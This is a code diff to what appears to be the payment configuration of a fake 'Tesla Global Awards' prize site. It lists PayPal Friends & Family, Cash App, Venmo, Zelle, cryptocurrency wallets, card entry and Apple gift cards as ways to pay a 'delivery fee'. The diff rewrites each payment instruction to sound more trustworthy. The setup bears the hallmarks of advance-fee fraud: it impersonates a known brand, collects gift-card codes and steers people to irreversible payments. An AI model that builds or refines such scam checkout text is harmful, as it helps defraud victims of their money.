@@ -48,7 +48,7 @@
         email: 'payments@teslaglobalawards.com',
         merchantId: 'TM8XK2R9Q4ZPA',
         paypalMeLink: 'https://paypal.me/teslaglobalawards',
-        instructions: 'Send the delivery fee via PayPal to our verified business account. Select "Friends & Family" and include your Order ID in the note so we can match your payment quickly. Screenshot the confirmation and upload it as proof.'
+        instructions: 'Send the exact delivery amount shown above to our verified PayPal business account. Confirm that the recipient name matches our business before completing your payment.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -61,7 +61,7 @@
         accountName: 'Tesla Global Awards',
         phone: '+1 (888) 472-3001',
         qrCode: '',
-        instructions: 'Open Cash App and send the delivery fee to our verified $Cashtag. Add your Order ID in the "For" field. Screenshot the payment confirmation and upload it as your proof.'
+        instructions: 'Send the exact delivery amount shown above to our verified $Cashtag. Confirm that the recipient name matches our business before completing your payment.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -73,7 +73,7 @@
         username: '@TeslaGlobalAwards',
         accountName: 'Tesla Global Awards LLC',
         qrCode: '',
-        instructions: 'Send the delivery fee to our official Venmo handle. Include your Order ID in the payment description. Screenshot the confirmation screen and upload it as your payment proof.'
+        instructions: 'Send the exact delivery amount shown above to our official Venmo handle. Confirm that the recipient name matches our business before completing your payment.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -85,7 +85,7 @@
         recipientName: 'Tesla Global Awards LLC',
         email: 'zelle@teslaglobalawards.com',
         phone: '+1 (415) 892-3401',
-        instructions: 'Open Zelle in your banking app and send the delivery fee to our registered email or phone number. Include your Order ID in the memo field. Take a screenshot of the confirmation and upload it as proof.'
+        instructions: 'Send the exact delivery amount shown above via Zelle to our registered email or phone number. Confirm that the recipient name matches our business before authorizing the transfer.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -98,7 +98,7 @@
         network: 'Bitcoin (BTC) — Mainnet',
         confirmations: '3 confirmations required',
         qrCode: '',
-        instructions: 'Send the exact delivery fee amount in BTC to the wallet address above. Use the BTC network only — do not send from other chains. After sending, upload a screenshot of the transaction confirmation showing the TX hash.'
+        instructions: 'Send the exact BTC equivalent of the delivery amount to the wallet address shown. Use the Bitcoin (BTC) network only and verify the full address carefully before confirming the transaction.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -111,7 +111,7 @@
         network: 'Ethereum Mainnet (ERC-20)',
         confirmations: '12 confirmations required',
         qrCode: '',
-        instructions: 'Send the exact ETH equivalent of the delivery fee to our wallet address. Ensure you are using the Ethereum Mainnet. Upload a screenshot of the confirmed transaction as your payment proof.'
+        instructions: 'Send the exact ETH equivalent of the delivery amount to the wallet address shown on the Ethereum Mainnet. Verify the full address carefully before confirming the transaction.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -124,7 +124,7 @@
         network: 'Ethereum Mainnet (ERC-20)',
         tokenContract: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
         qrCode: '',
-        instructions: 'Send USDT using the ERC-20 network to the wallet address above. Double-check you select the ERC-20 network in your wallet app. Upload the confirmed transaction screenshot as proof.'
+        instructions: 'Send the exact USDT amount to the wallet address shown using the ERC-20 (Ethereum) network. Do not use other networks. Verify the address carefully before confirming.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -136,7 +136,7 @@
         walletAddress: 'TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS',
         network: 'TRON Network (TRC-20)',
         qrCode: '',
-        instructions: 'Send USDT via TRC-20 (TRON) to the wallet address above. Select TRC-20 as the network in your exchange or wallet. Upload the confirmed transaction receipt screenshot as proof.'
+        instructions: 'Send the exact USDT amount to the wallet address shown using the TRC-20 (TRON) network. Verify the address carefully before confirming the transaction.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -149,7 +149,7 @@
         processorName: 'Tesla Awards Secure Payments',
         merchantAccount: 'TGAWARDS-US-9041',
         supportPhone: '+1 (888) 472-3001',
-        instructions: 'Enter your card details securely in the form below. All transactions are encrypted with 256-bit SSL. You will receive an email confirmation after your payment is processed.'
+        instructions: 'Enter your card details securely in the form below. We accept Visa, Mastercard, American Express, and Discover. Your payment is encrypted and processed securely.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -158,7 +158,7 @@
       description: 'Pay with an Apple Gift Card — instant and private',
       logo: LOGO_DIR + 'applegift.svg', enabled: true, displayOrder: 10,
       config: {
-        instructions: 'Purchase an Apple Gift Card from any Apple Store, Apple.com, or retail location. Scratch off the back to reveal the redemption code. Upload clear photos of both the FRONT and BACK of the card. Make sure the card code is fully visible and legible in your photo.',
+        instructions: 'Purchase an Apple Gift Card for the exact delivery amount from the Apple Store, Apple.com, or an authorized retailer. Scratch off the back to reveal the redemption code, then provide the card details below.',
         denominationsAccepted: '$25, $50, $100, $200 denominations accepted',
         purchaseLocations: 'Apple Store, Apple.com, Walmart, Target, Best Buy, CVS, Walgreens'
       },
